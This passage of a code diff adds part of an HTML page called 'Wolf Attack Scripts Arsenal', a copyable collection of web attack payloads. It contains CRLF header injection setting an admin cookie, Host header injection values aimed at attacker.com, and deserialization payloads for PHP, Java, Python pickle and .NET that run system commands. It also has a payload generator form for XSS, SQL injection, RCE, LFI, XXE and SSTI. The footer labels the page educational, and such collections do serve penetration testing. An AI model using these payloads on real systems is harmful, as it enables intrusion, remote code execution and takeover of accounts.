+%0A%0DSet-Cookie:admin=true
+%0D%0AContent-Type:text/html
+%0D%0AContent-Length:0
+
+<!-- Host Header Injection -->
+Host: attacker.com
+Host: victim.com:@attacker.com
+Host: victim.com%00.attacker.com
+Host: victim.com%20attacker.com
+Host: victim.com%09attacker.com
+            </div>
+        </div>
+
+        <!-- Deserialization Attacks -->
+        <div class="script-container severity-critical">
+            <div class="script-header">
+                <h5 class="mb-0">Deserialization Payloads</h5>
+                <span class="badge bg-danger">Critical</span>
+            </div>
+            <button class="btn btn-outline-success btn-sm copy-btn" onclick="copyScript(this)">📋 Copy</button>
+            <div class="script-content">
+<!-- PHP Deserialization -->
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
+
+<!-- Java Deserialization (ysoserial) -->
+# Generate with: java -jar ysoserial.jar CommonsCollections1 'whoami'
+# Base64 encoded payload would go here
+
+<!-- Python Pickle -->
+import pickle
+import os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+pickle.dumps(RCE())
+
+<!-- .NET Deserialization -->
+<ObjectDataProvider MethodName="Start" ObjectType="{x:Type Process}">
+    <ObjectDataProvider.MethodParameters>
+        <system:String>cmd</system:String>
+        <system:String>/c whoami</system:String>
+    </ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payload Generator Modal -->
+    <div class="modal fade" id="payloadGeneratorModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content bg-dark text-white">
+                <div class="modal-header border-warning">
+                    <h5 class="modal-title text-warning">🔧 Payload Generator</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6 class="text-info">Attack Type:</h6>
+                            <select class="form-select bg-dark text-white mb-3" id="attackType">
+                                <option value="xss">XSS</option>
+                                <option value="sqli">SQL Injection</option>
+                                <option value="rce">RCE</option>
+                                <option value="lfi">LFI</option>
+                                <option value="xxe">XXE</option>
+                                <option value="ssti">SSTI</option>
+                            </select>
+                            
+                            <h6 class="text-info">Target:</h6>
+                            <input type="text" class="form-control bg-dark text-white mb-3" id="targetUrl" placeholder="http://target.com/vulnerable.php?param=">
+                            
+                            <h6 class="text-info">Encoding:</h6>
+                            <select class="form-select bg-dark text-white mb-3" id="encoding">
+                                <option value="none">None</option>
+                                <option value="url">URL Encoding</option>
+                                <option value="html">HTML Encoding</option>
+                                <option value="base64">Base64</option>
+                                <option value="unicode">Unicode</option>
+                            </select>
+                        </div>
+                        <div class="col-md-6">
+                            <h6 class="text-info">Generated Payload:</h6>
+                            <textarea class="form-control bg-black text-success" id="generatedPayload" rows="10" readonly></textarea>
+                            <button class="btn btn-outline-success mt-2" onclick="generatePayload()">🔧 Generate</button>
+                            <button class="btn btn-outline-info mt-2" onclick="copyGeneratedPayload()">📋 Copy</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="container-fluid mt-5" style="background: linear-gradient(135deg, #000000 0%, #330000 100%); border-top: 3px solid #ff0000;">
+        <div class="row text-center py-4">
+            <div class="col-12">
+                <h3 class="fw-bold mb-3" style="color: #ffff00; text-shadow: 0 0 15px rgba(255, 255, 0, 0.8);">
+                    🐺 WOLF ATTACK SCRIPTS ARSENAL 🐺
+                </h3>
+                <p class="lead mb-3" style="color: #ffffff;">
+                    Comprehensive Cybersecurity Testing Scripts Collection
+                </p>
+                <p class="mb-3" style="color: #ff0000; font-weight: bold; font-size: 1.1rem;">
+                    Developed with ❤️ by <span style="color: #ffff00;">Tamilselvan</span>
+                </p>
+                <small class="text-muted">
+                    ⚠️ For Educational and Authorized Testing Only | © 2024 Wolf Cybersecurity Tools
+                </small>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="./assets/script-attacks.js"></script>
+</body>
+</html>
